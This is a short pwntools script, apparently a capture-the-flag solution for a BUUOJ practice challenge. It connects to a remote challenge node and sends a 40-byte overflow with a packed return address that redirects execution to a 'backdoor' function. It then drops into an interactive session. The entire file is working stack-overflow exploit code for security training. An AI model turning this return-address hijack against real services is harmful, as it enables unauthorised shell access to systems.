from pwn import *

# sh = process('pwn')
sh = remote('node5.buuoj.cn',26056)

backdoor_addr = 0x0400708 

payload = b'a'*40 + p64(backdoor_addr)

sh.sendline(payload)
sh.interactive()